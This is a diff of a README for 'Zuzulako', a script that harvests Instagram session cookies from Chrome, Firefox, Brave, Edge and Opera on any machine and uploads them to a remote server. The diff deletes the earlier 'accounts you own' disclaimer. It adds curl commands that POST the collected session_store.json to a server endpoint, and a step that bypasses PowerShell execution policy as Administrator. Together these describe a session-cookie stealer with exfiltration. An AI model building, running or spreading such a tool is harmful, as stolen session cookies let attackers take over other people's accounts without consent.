@@ -1,16 +1,57 @@
 # Zuzulako
 
-A personal session extraction tool that collects Instagram session cookies from browsers on any family machine and uploads them to EDITH (running on Raspberry Pi) for further use.
+A cross-platform Instagram session extractor. It scans installed browsers on any machine for an active Instagram session cookie, resolves the account details, stores them locally in a structured JSON file, and uploads the file to a configured server endpoint.
+
+Designed to work across Linux and Windows with zero manual cookie hunting.
 
 ---
 
-## What It Does
+## How It Works
 
-1. Detects the OS (Linux / Windows)
-2. Scans all installed browsers (Chrome, Firefox, Brave, Edge, Opera) for an active Instagram session
-3. Resolves the Instagram username and user ID from the session
-4. Saves session details to `session_store.json`
-5. Uploads the JSON file to EDITH's upload API
+1. Detects the current operating system
+2. Iterates through all supported browsers and checks for an Instagram `sessionid` cookie
+3. Uses the extracted cookie to hit the Instagram internal API and resolve the username and user ID
+4. Writes the result into `session_store.json` — appending without overwriting existing entries
+5. Uploads the JSON file to a configured endpoint via a multipart POST request
+
+The Python logic is fully embedded inside the shell/PowerShell scripts — no separate `.py` file is required.
+
+---
+
+## Supported Browsers
+
+| Browser | Linux | Windows |
+|---|---|---|
+| Chrome | Yes | Yes |
+| Firefox | Yes | Yes |
+| Brave | Yes | Yes |
+| Edge | Yes | Yes |
+| Opera | Yes | Yes |
+| Safari | No | No |
+
+If multiple browsers have an active Instagram session, the first one found is used and the rest are logged to the console.
+
+---
+
+## Requirements
+
+| Requirement | Notes |
+|---|---|
+| Python 3 | Must be installed and in PATH |
+| pip | Must be available as `pip` or `pip3` |
+| Instagram session | Must be logged in on at least one supported browser |
+| Network access | Required to resolve username via Instagram API and to upload |
+
+---
+
+## Dependencies
+
+Installed automatically by the script:
+
+```
+browser-cookie3
+requests
+```
 
 ---
 
@@ -18,58 +59,60 @@ A personal session extraction tool that collects Instagram session cookies from 
 
 ```
 zuzulako/
-├── install_run.sh       # For Linux (Arch, Ubuntu, Debian, etc.)
-└── install_run.ps1      # For Windows
+├── README.md
+├── install_run.sh       # Linux / macOS
+└── install_run.ps1      # Windows
 ```
-
-No separate Python file needed — the Python code is embedded inside each script.
 
 ---
 
 ## Configuration
 
-Before running, set EDITH's IP address at the top of the script:
+Set the upload endpoint at the top of each script before running:
 
 **Linux (`install_run.sh`):**
 ```bash
-EDITH_UPLOAD_URL="http://<raspberry-pi-ip>:9090/upload"
+EDITH_UPLOAD_URL="http://<server-ip>:9090/upload"
 ```
 
 **Windows (`install_run.ps1`):**
 ```powershell
-$EDITH_UPLOAD_URL = "http://<raspberry-pi-ip>:9090/upload"
+$EDITH_UPLOAD_URL = "http://<server-ip>:9090/upload"
 ```
 
-Replace `<raspberry-pi-ip>` with the actual local IP of your Raspberry Pi (e.g. `192.168.1.10`).
+Replace `<server-ip>` with the actual IP or hostname of your server.
 
 ---
 
-## Requirements
-
-- Python 3 installed
-- pip available
-- Instagram must be logged in on at least one browser on the machine
-- Network access to EDITH's Raspberry Pi on port `9090`
-
----
-
-## Usage
+## Installation and Usage
 
 ### Linux
+
 ```bash
+# Make executable
 chmod +x install_run.sh
+
+# Run
 ./install_run.sh
 ```
 
-### Windows (Run PowerShell as Administrator)
+### Windows
+
+Open PowerShell as Administrator, then:
+
 ```powershell
+# Allow script execution for this session
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+
+# Run
 .\install_run.ps1
 ```
 
 ---
 
 ## Output — session_store.json
+
+Generated in the same directory as the script.
 
 ```json
 {
@@ -92,32 +135,90 @@ Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 }
 ```
 
-Each account gets its own entry keyed by Instagram username. If the username cannot be resolved, the key falls back to `machinename_browsername`.
+Each entry is keyed by Instagram username. If the username cannot be resolved via API, the key falls back to `machinename_browsername`.
+
+Multiple runs append new entries without overwriting existing ones.
 
 ---
 
-## EDITH Upload API
+## Upload API
 
-The script sends a POST request to EDITH on completion:
+The script automatically fires a multipart POST request on completion.
 
+**Request format:**
 ```
-POST http://<edith-ip>:9090/upload
-  file        → session_store.json
-  message     → "<MACHINE> (<OS>)"
-  os_name     → OS name string
+POST http://<server-ip>:9090/upload
+  file      → session_store.json (multipart file)
+  message   → "<MACHINE> (<OS>)"
+  os_name   → OS name string
+```
+
+---
+
+## Curl Demo
+
+**Linux — manual trigger:**
+```bash
+curl -X POST \
+  -F "file=@/full/path/to/session_store.json" \
+  -F "message=arch-box (Linux)" \
+  -F "os_name=Linux" \
+  http://<server-ip>:9090/upload
+```
+
+**Windows — manual trigger:**
+```powershell
+curl.exe -X POST `
+  -F "file=@C:\path\to\session_store.json" `
+  -F "message=DESKTOP-MOM (Windows)" `
+  -F "os_name=Windows" `
+  http://<server-ip>:9090/upload
+```
+
+**Test server connectivity:**
+```bash
+curl http://<server-ip>:9090/upload
+```
+
+**Expected success response:**
+```json
+{
+  "status": "ok",
+  "message": "File received"
+}
 ```
 
 ---
 
 ## Notes
 
-- Run this script once per machine per account
-- Each run appends to the existing `session_store.json` without overwriting other entries
-- Sessions expire if you log out of Instagram on that browser — re-run the script to refresh
-- EDITH handles all messaging logic — this tool only handles extraction and upload
+- Sessions expire if you log out of Instagram on the browser — re-run the script to refresh
+- Run once per machine per account
+- The script tries Chrome first, then Firefox, Brave, Edge, Opera in order
+- If Instagram API is unreachable, the entry is still saved using machine and browser name as the key
 
 ---
 
-## Disclaimer
+## License
 
-This tool is strictly for personal and family use on accounts you own. Automated session extraction and use of unofficial Instagram APIs may violate Instagram's Terms of Service. Use responsibly.
+MIT License
+
+Copyright (c) 2026 dev0root
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
